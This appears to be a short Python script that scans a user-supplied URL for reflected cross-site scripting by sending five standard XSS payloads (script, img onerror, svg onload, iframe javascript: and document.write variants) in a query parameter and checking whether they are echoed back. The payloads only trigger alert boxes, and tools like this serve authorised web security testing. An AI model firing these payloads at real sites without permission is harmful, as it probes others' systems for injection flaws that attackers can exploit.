import requests

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<script>document.write('<img src=\'x\' onerror=alert(\'XSS\')>');</script>"
]

def scan_xss(url):
    print(f"Scanning {url} for XSS vulnerabilities...")

    for payload in payloads:
        test_url = f"{url}?q={payload}"
        try:
            response = requests.get(test_url)
            if payload in response.text:
                print(f"Potential XSS vulnerability found with payload: {payload} on URL: {test_url}")
        except requests.exceptions.RequestException as e:
            print(f"Error testing {url}: {e}")

if __name__ == "__main__":
    target_url = input("Enter URL to scan for XSS (e.g., https://example.com): ").strip()
    scan_xss(target_url)
